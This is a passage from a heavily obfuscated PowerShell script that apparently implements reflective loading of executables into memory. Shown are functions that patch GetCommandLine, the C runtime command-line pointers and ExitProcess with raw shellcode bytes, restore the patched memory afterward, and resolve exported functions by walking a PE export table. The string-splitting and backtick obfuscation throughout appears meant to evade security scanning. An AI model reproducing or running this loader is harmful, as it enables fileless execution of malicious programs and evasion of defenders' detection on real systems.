			${SEC`TioNh`eaDeR} =   ( varIabLE ("{1}{0}" -f 'MbH','jK5') -vaLu  )::"p`TR`T`OStrUct`UrE"(${Se`CTI`O`Nh`EA`deRPtr}, [Type]${W`iN3`2TYP`Es}."Im`A`g`e_sECtiOn_`hEaDer")
			[IntPtr]${s`eCtiON`ptr} = &("{4}{3}{1}{5}{2}{0}"-f 'igned','gnedIn','sUns','-Si','Add','tA') (${p`EIN`Fo}."Pe`hAn`DLE") (${SEc`TiONh`e`ADer}."vIrt`U`Al`ADdreSS")
			
			[UInt32]${p`ROTECtFL`Ag} = &("{0}{3}{2}{1}{5}{4}"-f'G','ualPr','t','et-Vir','ue','otectVal') ${SE`CT`IONHea`D`ER}."cHaraCt`E`RI`st`icS"
			[UInt32]${S`eCt`I`ONsiZe} = ${Se`c`TIOnh`EAd`eR}."v`IrTuALSI`ZE"
			
			[UInt32]${oLDPr`OtE`Ct`FlAG} = 0
			&("{2}{4}{1}{3}{0}" -f 'alid','emor','T','yRangeV','est-M') -DebugString ("{6}{0}{5}{1}{4}{8}{10}{3}{2}{9}{7}"-f'p','oryPr','ua',':Virt','otecti','date-Mem','U','rotect','onFla','lP','gs:') -PEInfo ${peI`N`Fo} -StartAddress ${SE`cTi`OnpTR} -Size ${se`ctIonsi`ze} | &("{1}{0}"-f'ull','Out-N')
			${SU`c`CEss} = ${wI`N32`FUncti`oNs}."V`IRt`UaLPr`ot`ect"."in`VOke"(${SEc`TIONp`Tr}, ${S`Ec`TioN`SIzE}, ${p`ROt`eCt`FLaG}, [Ref]${O`lDpROTeCtF`L`Ag})
			if (${SuCc`eSs} -eq ${Fa`l`Se})
			{
				Throw ("{0}{3}{4}{7}{5}{8}{2}{1}{6}" -f 'Unabl','ti','otec','e ','to change','mory','on',' me',' pr')
			}
		}
	}
	

	Function UpDaTE-eXe`Fun`CTI`OnS
	{
		Param(
		[Parameter(pOsiTion = 0, MAnDAtOrY = ${tr`Ue})]
		[System.Object]
		${Pe`I`NFO},
		
		[Parameter(PoSItiON = 1, mAnDatorY = ${tr`Ue})]
		[System.Object]
		${wIN`32fUnCT`I`OnS},
		
		[Parameter(positiON = 2, mAndAtory = ${Tr`Ue})]
		[System.Object]
		${w`in`32`co`NSTaNTS},
		
		[Parameter(PoSiTIoN = 3, MAndATOry = ${T`Rue})]
		[String]
		${EXEA`RGuMe`NtS},
		
		[Parameter(pOSITiOn = 4, MANDaTORy = ${TR`Ue})]
		[IntPtr]
		${eXEdoNE`B`Y`Te`PtR}
		)
		
		${rET`UR`N`ARRay} = @() 
		
		${pT`RSI`zE} =   (  vArIaBle ("{0}{1}"-f 'jk5Mb','H') -vaLUeON)::"s`iZeoF"([Type][IntPtr])
		[UInt32]${OLdPR`otec`T`FLaG} = 0
		
		[IntPtr]${KERne`L`3`2hanD`Le} = ${wIn32`F`Unc`TiOns}."GE`T`m`oDul`eHaNdle"."iNv`oKe"(("{3}{2}{1}{0}" -f 'll','2.d','ernel3','K'))
		if (${keR`NEl3`2HaNd`LE} -eq   (Gi  ("{0}{2}{1}"-f'VariaB','P7d','le:j'))."v`ALUE"::"ze`Ro")
		{
			throw ("{0}{3}{5}{6}{4}{2}{1}"-f'Ker','null','andle ','nel','h','32',' ')
		}
		
		[IntPtr]${KEr`N`ElBASe`H`AN`DLe} = ${W`In3`2fUncTIo`Ns}."GeT`M`Od`UleHAnDLe"."iN`V`OKe"(("{1}{3}{2}{4}{0}" -f'l','K','Base.d','ernel','l'))
		if (${KeRnE`LbaS`EHaND`Le} -eq  ${J`p7d}::"zE`Ro")
		{
			throw ("{4}{1}{5}{2}{0}{3}" -f'ndle nu','nelB',' ha','ll','Ker','ase')
		}

		${cM`DL`in`E`WargsptR} =   ( LS ('vAria'+'bl'+'E:Jk5mbH'))."vaL`Ue"::("{0}{4}{3}{2}{1}" -f 'Str','ni','GlobalU','gToH','in').Invoke(${e`xe`A`R`gUmentS})
		${C`Md`liNeAar`GsptR} =   (Ls  ("vaR"+"IAbLe:JK5mb"+"h"))."v`AlUE"::("{2}{4}{3}{5}{0}{1}"-f 'alA','nsi','Str','ToHGlo','ing','b').Invoke(${exEA`R`gumeN`TS})
	
		[IntPtr]${gETc`OMm`AnDLI`N`e`Aaddr} = ${wiN32`FuNc`TiOns}."Get`pRoc`ADd`R`Ess"."iN`VoKe"(${KeR`Ne`l`BASehAndlE}, ("{2}{1}{0}{3}"-f'Line','d','GetComman','A'))
		[IntPtr]${gETCo`mmAn`dl`iNeW`AD`dr} = ${WIn3`2fu`N`CtIOns}."G`etpR`OCADDresS"."inVO`Ke"(${keRn`e`lBAseh`ANDLe}, ("{3}{1}{2}{0}"-f 'eW','etComm','andLin','G'))

		if (${GET`cOmmA`NDl`iNEaADdr} -eq   ${j`p7d}::"Z`ErO" -or ${Get`coMmaNdLIn`e`WaDDr} -eq  (  itEm  ("va"+"RIAb"+"Le:Jp"+"7"+"d"))."vA`LUE"::"z`ero")
		{
			throw ('GetCo'+'mma'+'ndL'+'i'+'ne '+'p'+'tr '+'null'+'.'+' '+'GetCom'+'ma'+'ndLin'+'eA: '+"$GetCommandLineAAddr. "+'G'+'et'+'C'+'ommand'+'Lin'+'eW: '+"$GetCommandLineWAddr")
		}

		[Byte[]]${S`hEllcod`E1} = @()
		if (${P`Tr`SIZe} -eq 8)
		{
			${Sh`E`Llco`dE1} += 0x48	
		}
		${ShELl`C`O`De1} += 0xb8
		
		[Byte[]]${ShElL`co`DE2} = @(0xc3)
		${toTa`l`SIzE} = ${s`hEL`LcoDe1}."leNg`TH" + ${PtR`SI`ZE} + ${shEl`L`CoDe2}."LE`Ng`TH"
		
		
		${getco`MM`AndLi`NEa`oRi`g`BY`TeSPTr} =  ( varIaBlE ("{0}{1}" -f'jK5MB','H') -va )::("{0}{1}{3}{2}" -f 'Allo','cH','obal','Gl').Invoke(${TOtaL`SI`ZE})
		${GeT`cOmMaNdL`in`e`Wo`RiGby`T`E`SPtR} =  ${jK`5`mbh}::("{1}{2}{0}{3}"-f'Glob','Alloc','H','al').Invoke(${tOta`LS`izE})
		${W`IN3`2f`UNctIO`Ns}."M`Emcpy"."iN`VOkE"(${G`EtcOmmanD`lIn`E`AoRI`GBYtEsPtr}, ${getCOMM`ANdLI`NEA`A`D`DR}, [UInt64]${T`O`Tal`sizE}) | &("{1}{0}"-f 'ull','Out-N')
		${w`In32Funct`I`ONS}."me`MCPy"."i`NVOKE"(${GE`T`COmma`NDLINEwo`Ri`g`BYtESPTR}, ${GE`TCommA`ND`lInEw`AD`dR}, [UInt64]${T`OtAlS`i`ze}) | &("{2}{1}{0}" -f'l','ul','Out-N')
		${retURn`AR`RAy} += ,(${gEtcO`mmA`NDL`INE`A`ADDR}, ${GeTcoMmAn`dl`IN`E`A`ORIgBy`TES`PtR}, ${tOT`Alsi`ze})
		${rETUR`Na`RR`AY} += ,(${G`ET`C`OMMAndlINEwa`D`Dr}, ${gEtcOm`m`ANDl`INE`WoriGb`YTeSp`TR}, ${TO`Talsi`zE})

		[UInt32]${oLDp`ROT`eCtFl`AG} = 0
		${Suc`c`eSs} = ${WIn3`2`FU`NCTionS}."VIRtual`P`R`Ot`ect"."invO`KE"(${g`Etc`oMmANDlI`Ne`A`Addr}, [UInt32]${t`Otals`iZE}, [UInt32](${wIN32`CoNS`TaNTs}."pAg`e`_eX`eCU`TE_ReaDwriTE"), [Ref]${oldp`R`O`TectFL`AG})
		if (${SUc`CE`Ss} = ${FAL`sE})
		{
			throw ("{6}{5}{1}{3}{2}{0}{4}" -f 'e','rot','l','ect fai','d','tualP','Call to Vir')
		}
		
		${GEtCoMM`ANdLinE`A`AddR`TEMP} = ${g`e`T`C`O`MMANDLIneAAD`DR}
		&("{2}{4}{0}{1}{3}"-f'Bytes','ToMemo','Wr','ry','ite-') -Bytes ${SHe`LlC`ODE1} -MemoryAddress ${g`eT`CommAN`dli`NeAAdd`RTEmP}
		${geTCO`mMAnd`L`in`Ea`ADDr`TEmP} = &("{3}{2}{5}{0}{1}{4}" -f 'A','sU','dd-','A','nsigned','SignedInt') ${GetC`Om`m`ANdliNeA`ADd`Rt`EMP} (${sHeLLcO`D`E1}."lEN`GTH")
		 (  iTeM  ('vaRIA'+'BlE:jK5'+'m'+'BH') )."val`UE"::("{0}{2}{3}{1}" -f 'St','r','ructureT','oPt').Invoke(${Cm`D`l`iNEAArGSpTr}, ${gE`TC`OM`mAndLI`NEaADDR`TE`mp}, ${Fa`L`sE})
		${g`ETCo`MmANdl`I`NE`AaDDRt`eMP} = &("{3}{0}{1}{2}" -f'ignedIn','tAs','Unsigned','Add-S') ${GEtC`oM`M`A`Ndlin`e`Aa`DDrteMp} ${p`Trs`ize}
		&("{3}{1}{2}{5}{0}{4}"-f 'o','ite-','Byt','Wr','Memory','esT') -Bytes ${s`hEl`LcoDE2} -MemoryAddress ${g`ET`CO`M`MANdline`AaDdRTe`Mp}
		
		${wIN32FUN`c`TI`oNS}."VI`RT`UalprOt`e`cT"."i`N`VOKE"(${Ge`TC`ommA`NDLI`Neaa`DDR}, [UInt32]${TOtAlS`i`ze}, [UInt32]${OldPR`oTeC`TFL`AG}, [Ref]${oLDpR`OtE`CT`FL`Ag}) | &("{1}{0}{2}" -f 'ut-','O','Null')
		
		
		[UInt32]${oL`D`pROtECtFLAG} = 0
		${sUcC`E`SS} = ${wIN3`2Fu`NC`TI`ons}."v`IR`T`UalPro`TeCT"."InVO`KE"(${g`e`Tc`Omman`Dl`iNeWaddR}, [UInt32]${tO`TAl`SI`Ze}, [UInt32](${w`in3`2COn`sTAN`TS}."page_E`xECuTE`_reaDW`RI`TE"), [Ref]${O`lDp`ROTEC`TFlAg})
		if (${SU`Cc`Ess} = ${FA`LSE})
		{
			throw ("{0}{4}{2}{3}{7}{1}{6}{5}" -f 'C','c','Virt','ualP','all to ','ailed','t f','rote')
		}
		
		${geTc`oMm`A`Ndl`iN`ewAdDrT`EMP} = ${GETCOmman`dLI`NEw`AD`dr}
		&("{2}{4}{0}{1}{3}" -f 'Me','mor','Write-B','y','ytesTo') -Bytes ${SHE`lL`cOd`E1} -MemoryAddress ${geTc`o`Mma`NDLIneWaDD`RTEMP}
		${GeT`c`om`MA`NdLi`N`ewaDd`RteMp} = &("{3}{1}{0}{2}"-f'ntAs','I','Unsigned','Add-Signed') ${ge`TcOm`MANDlIN`eW`AD`DrTemp} (${sHEL`lCOd`E1}."L`engtH")
		 ( geT-ChIldITeM ("{3}{1}{2}{0}" -f'k5MBh','Le',':j','vARiAB'))."v`AlUE"::("{0}{1}{2}"-f 'Structure','ToP','tr').Invoke(${C`mDLiNew`Ar`g`sPtr}, ${gEtCo`mmA`N`DlinEwa`ddr`T`e`mp}, ${F`Alse})
		${G`EtcOmM`A`NdLIn`E`Wad`dR`TEMP} = &("{1}{3}{4}{2}{5}{0}"-f'tAsUnsigned','Ad','ed','d-S','ign','In') ${gE`TC`oM`M`ANDLI`NeWadDRTeMP} ${p`T`RSIzE}
		&("{0}{1}{2}{3}" -f 'Write-By','tesT','oMe','mory') -Bytes ${S`h`eLlC`OdE2} -MemoryAddress ${getCommaNDl`InEwa`dd`R`T`EmP}
		
		${wIn3`2fun`C`TIo`NS}."vir`T`UalPrO`TecT"."invO`kE"(${GEt`C`OMMa`NdlINEWADDr}, [UInt32]${TOtA`L`sizE}, [UInt32]${oLd`pR`O`TecTfLaG}, [Ref]${oL`D`pr`OTEC`TfLag}) | &("{1}{0}{2}"-f '-N','Out','ull')
		
		
		${dLlLi`St} = @(("{3}{2}{1}{0}" -f 'r70d.dll','vc','s','m'), ("{0}{2}{1}" -f'msvcr','dll','71d.'), ("{0}{2}{1}{3}"-f'msvcr8','d.d','0','ll'), ("{3}{2}{1}{0}"-f 'll','d','vcr90d.','ms'), ("{1}{0}{2}{3}"-f'vcr100d.d','ms','l','l'), ("{0}{1}{2}"-f'msvcr1','10d.d','ll'), ("{0}{2}{3}{1}" -f 'm','dll','svcr','70.') `
			, ("{1}{2}{0}"-f'll','msvcr','71.d'), ("{1}{2}{0}"-f'80.dll','msv','cr'), ("{3}{2}{0}{1}"-f'r90','.dll','c','msv'), ("{2}{1}{0}{3}"-f '10','vcr','ms','0.dll'), ("{1}{0}{2}" -f 'vcr11','ms','0.dll'))
		
		foreach (${d`lL} in ${dL`L`LisT})
		{
			[IntPtr]${d`LLhAND`le} = ${WIN`32FU`Ncti`ons}."Ge`TMoDUl`E`HanD`lE"."iN`VokE"(${d`LL})
			if (${DLLh`AND`LE} -ne   ${J`P7D}::"z`ErO")
			{
				[IntPtr]${w`cm`DlNadDr} = ${W`In3`2`FuncTiONs}."ge`TP`Roc`ADdResS"."I`Nv`oKe"(${dLlH`A`N`dLE}, ("{1}{2}{0}" -f 'n','_wcmd','l'))
				[IntPtr]${acm`dlN`A`dDR} = ${W`iN`32fU`NctIONS}."Get`p`Ro`CaddRESs"."IN`VOkE"(${Dl`LHA`N`dlE}, ("{0}{2}{1}" -f '_','ln','acmd'))
				if (${WC`mDLN`A`DdR} -eq  ( gEt-VARIable  ("jp7"+"D") -valuEoNL )::"z`ERo" -or ${aCMDLn`A`ddR} -eq   ${jP`7D}::"Z`ERo")
				{
					((("{0}{1}{6}{7}{2}{8}{5}{4}{3}" -f'Error, coul','dn','or','n','mdl','_ac','2SDt find _wcmdln',' ',' '))."Re`PlACE"(([ChAR]50+[ChAR]83+[ChAR]68),[STriNg][ChAR]39))
				}
				
				${Ne`WACm`DlNPTr} =   ${jk`5m`Bh}::("{1}{3}{2}{0}{4}" -f 'obalAn','Str','oHGl','ingT','si').Invoke(${E`xeARG`U`M`eNTS})
				${N`eWwCmDl`NptR} =  (  GEt-VaRiaBLE  ('jK5'+'MBh') )."v`ALue"::("{0}{4}{2}{3}{1}"-f'Stri','obalUni','oHG','l','ngT').Invoke(${ExEaRGU`M`EN`Ts})
				
				${ORi`GA`c`mDl`NPtR} =   ${JK`5M`Bh}::"pTrt`Os`TRUcTure"(${a`cMD`Lna`dDR}, [Type][IntPtr])
				${o`R`iGWCmd`lN`pTr} =   (VARiAblE ("{0}{1}"-f'Jk','5MBH')  -ValuE )::"PtrT`oSTrU`ct`U`RE"(${wCmD`l`Naddr}, [Type][IntPtr])
				${oR`ig`A`cMdln`P`TR`sTOragE} =  ( Get-ChiLDITEm ("{1}{0}{2}{3}" -f 'rIabl','Va','e:j','k5MBH')  )."vA`lUe"::("{3}{0}{2}{1}"-f'locHGlo','al','b','Al').Invoke(${p`TRsi`ZE})
				${oRIg`WcmDL`Np`TRs`TORaGE} =   ${J`k5MBH}::("{2}{0}{1}" -f 'locHGlob','al','Al').Invoke(${pTR`s`IzE})
				  ${j`K5m`Bh}::("{3}{4}{2}{1}{0}"-f 'eToPtr','ur','t','Str','uc').Invoke(${Orig`AcM`Dln`pTr}, ${oriGaCMDl`NP`TRstora`Ge}, ${FA`LSE})
				 ${JK5`MbH}::("{3}{1}{0}{2}"-f 'ureToPt','truct','r','S').Invoke(${orig`w`CMD`Lnptr}, ${or`IGw`c`mDlNPTrStoRagE}, ${Fa`lsE})
				${R`ETUrNA`RRAy} += ,(${ACm`DlnA`d`Dr}, ${ORIGAcm`DL`NPT`RST`O`Ra`ge}, ${P`TR`sIZe})
				${re`TurNa`Rr`AY} += ,(${wcMdL`NA`d`dr}, ${ORi`GwcMD`lnptrStoRA`GE}, ${pT`RSIze})
				
				${SuCCe`ss} = ${WIN`3`2`FUnCtions}."Vi`RT`Ua`LP`ROtect"."I`NvoKe"(${ACMD`LN`A`ddr}, [UInt32]${PT`RSizE}, [UInt32](${Wi`N`32CO`Ns`TanTS}."pa`ge`_exEc`UtE_`REaDWRItE"), [Ref]${o`lDp`ROtEcT`FL`AG})
				if (${sUC`cE`Ss} = ${f`A`lsE})
				{
					throw ("{1}{4}{2}{5}{3}{0}" -f 'ailed','Call ','Virt','Protect f','to ','ual')
				}
				 (GET-vaRiABlE  ("j"+"k5MBH") -valU)::("{2}{0}{1}"-f 'tructureT','oPtr','S').Invoke(${NewAC`md`ln`ptr}, ${A`c`m`DlnAdDR}, ${f`A`lsE})
				${W`IN32`F`UNCTIOnS}."ViRTuAL`PRo`Te`Ct"."inVO`ke"(${aCMDL`NAd`dr}, [UInt32]${pt`RS`IzE}, [UInt32](${OLd`protE`ctfLAg}), [Ref]${O`l`DprOTeCt`FlaG}) | &("{0}{2}{1}" -f'O','l','ut-Nul')
				
				${Su`Cc`ESs} = ${W`I`N3`2`FuncTIONs}."vIR`TuaLprOTE`cT"."i`Nvoke"(${wC`mDLNad`dr}, [UInt32]${P`TRSi`Ze}, [UInt32](${wiN32`C`O`NstAntS}."paGE_`EXe`C`Ute_r`E`A`DWriTE"), [Ref]${oLDPROT`ECtf`LaG})
				if (${sU`cc`eSs} = ${FAl`sE})
				{
					throw ("{7}{3}{4}{1}{5}{0}{2}{6}"-f 'e','alPro','ct fai','o Virt','u','t','led','Call t')
				}
				  (GEt-Item ("varI"+"AbLE:"+"j"+"k5Mbh") )."V`AluE"::("{4}{3}{1}{2}{0}" -f 'oPtr','e','T','tructur','S').Invoke(${nE`wwCMDLN`PtR}, ${wCMdL`Na`Ddr}, ${f`AlSE})
				${WIn32f`U`NC`TI`ONS}."v`irtU`A`LPrOTe`Ct"."inv`oke"(${w`cmdl`Naddr}, [UInt32]${p`TrSIzE}, [UInt32](${OlD`pRO`T`Ec`TFLAG}), [Ref]${oLdP`R`otEcT`FlAG}) | &("{0}{1}{2}"-f'O','ut-','Null')
			}
		}
		
		

		${rE`TU`RNARRAY} = @()
		${E`X`iTF`UnCTioNs} = @() 
		
		[IntPtr]${M`ScoR`e`ehANdle} = ${Win3`2FuN`CTIo`Ns}."GEtMO`du`lE`HAn`DlE"."INvo`kE"(("{2}{1}{3}{0}"-f '.dll','or','msc','ee'))
		if (${mSCO`R`E`EhAnd`lE} -eq  (  Gi ("{0}{1}{2}{3}" -f'vAr','IAb','LE:Jp','7d')  )."VA`LuE"::"Z`eRo")
		{
			throw ("{3}{4}{1}{0}{2}" -f 'le nu','d','ll','mscoree ','han')
		}
		[IntPtr]${cOrexI`TP`ROC`ESsAdDR} = ${Wi`N32FuNCT`IO`NS}."g`Et`PRO`CadDrEss"."InVO`Ke"(${m`SCOree`ha`NDlE}, ("{0}{2}{1}{3}" -f'CorExitPr','es','oc','s'))
		if (${CoReXI`TproCEsS`A`DdR} -eq   ${J`p7d}::"z`ERo")
		{
			Throw ("{7}{2}{4}{3}{9}{1}{8}{0}{6}{5}"-f'ress','s','orExit','c','Pro','und',' not fo','C',' add','es')
		}
		${ExitF`U`NCT`iONS} += ${corexi`TPRoCE`SS`A`ddr}
		
		[IntPtr]${e`xi`TpRoCESsA`D`dR} = ${wIn`32fun`CtIo`Ns}."ge`TP`R`O`caddresS"."I`NVOkE"(${kErnEl`32HAN`d`lE}, ("{1}{0}{2}" -f'xitPr','E','ocess'))
		if (${ExitPr`o`Ces`sAdDR} -eq   (DIR ('vA'+'rIablE:'+'jp7d') )."V`ALUe"::"Z`eRO")
		{
			Throw ("{3}{7}{4}{1}{8}{6}{0}{2}{5}"-f'ress n','tProces','ot foun','E','i','d','d','x','s ad')
		}
		${eXITf`U`Nc`T`IOns} += ${eXitP`Roc`ES`sAddR}
		
		[UInt32]${O`ldProT`ECtfl`AG} = 0
		foreach (${ProCEX`It`FUnctiOnA`D`DR} in ${e`XITFUNC`TiO`NS})
		{
			${PRocExi`TfUn`CtI`On`Addrtmp} = ${PRO`cexiT`FU`N`cTiO`N`ADDr}
			[Byte[]]${SH`ELl`co`DE1} = @(0xbb)
			[Byte[]]${sHEll`C`oD`e2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${Pt`RSIzE} -eq 8)
			{
				[Byte[]]${s`HEllco`DE1} = @(0x48, 0xbb)
				[Byte[]]${shELl`C`OD`E2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${s`H`ElLCoD`E3} = @(0xff, 0xd3)
			${TOTAl`s`ize} = ${sHE`LLCo`de1}."l`eng`Th" + ${Pt`Rs`IZE} + ${S`h`eLLc`Ode2}."l`E`NgTH" + ${Ptrs`iZe} + ${SHell`CO`D`E3}."leN`gTH"
			
			[IntPtr]${EXiTTHrE`ADAd`DR} = ${Win`3`2f`UnCTIonS}."GEtp`RocaD`Dr`ESS"."INVO`kE"(${Ke`R`Nel32H`AndLe}, ("{2}{1}{0}"-f 'Thread','it','Ex'))
			if (${eX`i`T`ThreadAD`dr} -eq  (  get-vAriaBLE ("JP"+"7D")  )."Val`UE"::"z`eRO")
			{
				Throw ("{3}{0}{7}{6}{5}{4}{2}{1}" -f 'tThrea','d',' foun','Exi','ot','ddress n','a','d ')
			}

			${SU`CceSS} = ${WI`N3`2F`UNct`iOns}."VIRt`Ua`lPROT`ecT"."In`V`OkE"(${PRO`cE`x`i`TFuncTIona`DdR}, [UInt32]${T`oTALS`IzE}, [UInt32]${wI`N32`cO`NStAnTS}."paGE_`exECUT`E_reA`DW`RI`TE", [Ref]${oLdpro`TE`ctF`L`Ag})
			if (${SUccE`Ss} -eq ${Fal`SE})
			{
				Throw ("{3}{0}{1}{4}{2}" -f'o',' VirtualPro','ect failed','Call t','t')
			}
			
			${ex`itprO`CEs`sO`RI`gbYTeSP`Tr} =   ${JK5M`Bh}::("{3}{2}{1}{0}" -f 'l','HGloba','c','Allo').Invoke(${tota`l`sizE})
			${w`In32`FUn`CtI`oNS}."mEmC`Py"."IN`V`OKE"(${ex`i`TPr`oCEssoRIGBytE`SPTr}, ${P`RocEX`It`Fu`NCtiONaDdR}, [UInt64]${ToTA`lS`Ize}) | &("{1}{0}{2}"-f'ut-N','O','ull')
			${reTur`N`A`Rray} += ,(${PR`oCexitfUn`CtIonA`DDr}, ${ExiTp`ROCe`ssOr`i`g`ByTesP`Tr}, ${tota`ls`iZE})
			
			&("{1}{4}{3}{5}{0}{2}"-f 'emor','Write-','y','sT','Byte','oM') -Bytes ${SH`ellcO`d`e1} -MemoryAddress ${pROCexItFun`cT`ION`AD`drTMp}
			${PrOCeX`iTfUN`CtioNad`Dr`TMP} = &("{0}{1}{5}{2}{4}{3}{6}" -f 'Add-Si','gnedIn','A','i','sUns','t','gned') ${pRoCexiT`FUn`Ct`ion`A`ddrTMp} (${SHeLL`cO`de1}."LEN`G`TH")
			 ( GI ("VAR"+"IA"+"B"+"lE:jK5MbH") )."VA`Lue"::("{0}{2}{1}"-f 'S','Ptr','tructureTo').Invoke(${eXeDO`N`ebYteptR}, ${Pro`CExit`FU`Nc`TioN`AdDRtMP}, ${Fal`se})
			${pR`o`c`EXitFUNcTi`OnAd`D`R`TmP} = &("{1}{5}{4}{0}{3}{2}"-f'tAs','Ad','ed','Unsign','ignedIn','d-S') ${Pr`o`Ce`XitFU`NCT`iONADdrT`mP} ${PTRs`i`ZE}
			&("{1}{0}{3}{4}{2}" -f 'ite-By','Wr','Memory','tes','To') -Bytes ${sHel`Lc`oDE2} -MemoryAddress ${pr`ocexIt`FUnc`Tion`A`dDR`T`MP}
			${p`R`O`Ce`xI`TfuncTi`ONAD`DRtmp} = &("{4}{2}{1}{0}{3}{5}"-f'ns','d-SignedIntAsU','d','igne','A','d') ${Pro`CeXit`F`UnCtIONa`d`drTmP} (${shE`LL`COde2}."le`N`gtH")
			 ${j`K`5mBH}::("{3}{2}{1}{0}" -f'r','eToPt','r','Structu').Invoke(${EXI`Tthread`A`d`Dr}, ${proCeX`itFuNCTiONa`d`d`R`TMP}, ${F`ALSe})
			${pr`o`CE`XITfunc`T`io`NAddR`TmP} = &("{0}{1}{4}{2}{3}"-f 'Add-SignedI','ntAsUn','n','ed','sig') ${proC`e`x`iTF`UnCtI`OnA`ddRtmp} ${pTR`SI`Ze}
			&("{1}{3}{0}{5}{2}{4}" -f'o','Write-Byte','e','sT','mory','M') -Bytes ${SHel`L`CodE3} -MemoryAddress ${pROC`eX`It`FuN`c`TiONA`ddRtMP}

			${WiN3`2`F`UNcTioNS}."Vir`TuALpRoTe`cT"."i`NVokE"(${p`RocEXitFu`Nct`iON`A`D`Dr}, [UInt32]${to`TAls`izE}, [UInt32]${olD`pr`OT`Ec`TFlaG}, [Ref]${oldp`ROte`c`T`FLag}) | &("{1}{2}{0}" -f 't-Null','O','u')
		}

		&("{0}{2}{1}"-f'Wri','e-Output','t') ${RETu`Rn`A`RRAy}
	}
	
	
	Function CO`p`Y-aR`RAyO`Fme`M`ADDress`es
	{
		Param(
		[Parameter(POsItion = 0, mANDatory = ${t`RUe})]
		[Array[]]
		${cop`yiN`Fo},
		
		[Parameter(pOsITIOn = 1, maNDATORY = ${tr`Ue})]
		[System.Object]
		${WiN32F`Un`c`TIo`NS},
		
		[Parameter(pOSItiON = 2, mandATOry = ${tR`Ue})]
		[System.Object]
		${win32consT`A`N`Ts}
		)

		[UInt32]${oLDprO`Te`C`T`Flag} = 0
		foreach (${iN`Fo} in ${c`oPYiN`Fo})
		{
			${suCc`EsS} = ${w`iN`32fUnCtIoNs}."Vi`RTuA`lp`RotECt"."in`VoKe"(${in`Fo}[0], [UInt32]${IN`Fo}[2], [UInt32]${wIn32`C`o`NSTa`Nts}."pA`GE_ExEc`Ute_`R`eAdWr`iTe", [Ref]${o`LdP`R`oTec`TflAg})
			if (${s`U`cCesS} -eq ${FAl`SE})
			{
				Throw ("{0}{6}{1}{3}{2}{4}{5}"-f 'Call to','tual','ai','Protect f','le','d',' Vir')
			}
			
			${WI`N32fU`NcTI`oNs}."mEmc`py"."InVO`Ke"(${i`NfO}[0], ${I`NFO}[1], [UInt64]${I`NFo}[2]) | &("{1}{0}{2}" -f'ut','O','-Null')
			
			${wI`N32Fu`Nc`TIoNS}."vIrTuA`L`prOT`e`CT"."InVO`KE"(${i`NfO}[0], [UInt32]${iN`Fo}[2], [UInt32]${O`ldPrOtectf`L`AG}, [Ref]${ol`DprOTeCTFl`Ag}) | &("{0}{1}" -f 'Ou','t-Null')
		}
	}


	Function gEt`-`meM`oryPRo`Ca`dDRE`sS
	{
		Param(
		[Parameter(POsItiOn = 0, MaNDaTORY = ${tR`UE})]
		[IntPtr]
		${PehAN`D`lE},
		
		[Parameter(pOsiTiOn = 1, MandatorY = ${tr`Ue})]
		[String]
		${FunCt`Io`N`NAmE}
		)
		
		${WI`N32`Typ`es} = &("{4}{1}{2}{3}{0}" -f 's','i','n3','2Type','Get-W')
		${wIN`32`C`onStAN`TS} = &("{1}{2}{0}{3}" -f'tan','Ge','t-Win32Cons','ts')
		${PEI`N`FO} = &("{4}{0}{3}{1}{2}" -f 't-PED','nf','o','etailedI','Ge') -PEHandle ${P`eHAND`le} -Win32Types ${wi`N`3`2tYpeS} -Win32Constants ${WiN`3`2cO`NST`AntS}
		
		if (${P`EI`NfO}."i`M`AGe_nt_`heAdERS"."o`pT`IONaLh`ead`er"."e`xPoR`T`TAbLE"."sI`Ze" -eq 0)
		{
			return  ( get-vARIaBlE  ("{0}{1}" -f'J','P7d'))."VAl`UE"::"Ze`RO"
		}
		${EX`PoR`TT`ABlEPTR} = &("{3}{4}{1}{5}{2}{0}"-f'ed','dIntAsUn','gn','A','dd-Signe','si') (${Pe`h`A`NDLe}) (${pEIN`FO}."I`mage_`NT_He`AdErS"."o`PtIonAlHEaD`eR"."ExPo`Rt`TAble"."VirTU`Aladd`Ress")
		${ExPor`Tta`BLe} =  (Ls  ("{2}{0}{1}"-f 'Ri','able:Jk5mBH','vA')  )."va`luE"::"ptrToSTr`UcTu`Re"(${E`XpORtTabL`Eptr}, [Type]${wiN`32tY`peS}."iMAg`E_E`xp`Ort_DI`RecT`orY")
		
		for (${i} = 0; ${I} -lt ${eXPoRtT`Ab`Le}."N`Um`Ber`oF`NAmes"; ${I}++)
		{
			${Nam`e`offsET`PTR} = &("{5}{2}{0}{4}{1}{3}"-f 'ed','i','n','gned','IntAsUns','Add-Sig') (${PEhan`dlE}) (${e`Xp`oRTtaBLe}."AD`d`RESsOFnaMEs" + (${I} *  ${jK`5`MbH}::"S`i`ZeoF"([Type][UInt32])))
			${nA`Me`ptR} = &("{4}{1}{0}{2}{3}"-f 'n','dI','tAsU','nsigned','Add-Signe') (${PeH`A`NdLe}) ( ( gEt-chIldITem  ("{1}{3}{2}{4}{0}"-f'bh','Va','lE:J','rIAB','K5M') )."v`AlUE"::"P`Trt`OsTRu`cTUre"(${NAMeo`F`FSe`TpTR}, [Type][UInt32]))
			${N`AMe} =   (GEt-VAriaBle ("{1}{0}"-f 'Bh','jK5M')  )."VAL`Ue"::("{2}{0}{1}" -f'rToStri','ngAnsi','Pt').Invoke(${NameP`TR})

			if (${n`AME} -ceq ${fU`NctI`O`Nn`AME})
			{
				${OrD`IN`Alptr} = &("{0}{1}{5}{4}{2}{6}{3}"-f'A','d','IntAs','ned','-Signed','d','Unsig') (${pEHan`D`lE}) (${E`X`poRTtab`le}."AD`drE`S`Sofna`meoRDINa`Ls" + (${I} *   (GEt-vaRiAbLE  ("{0}{1}" -f'jK','5MbH') -vaLueON  )::"SizE`OF"([Type][UInt16])))
				${F`Un`CinDeX} =  ( get-cHilditem ("VarIAB"+"LE:"+"jk"+"5mbH"))."vA`lUE"::"P`TrToSt`R`UctUre"(${orDin`AL`ptr}, [Type][UInt16])
				${f`UncOFFSeT`A`ddr} = &("{6}{5}{1}{0}{4}{3}{2}" -f'As','dInt','ned','nsig','U','igne','Add-S') (${p`e`hAndlE}) (${EXPO`RTt`A`BLE}."AdD`RES`soffuNCti`o`Ns" + (${fu`Nc`INDEx} *   ${jK5`M`Bh}::"s`i`ZeoF"([Type][UInt32])))
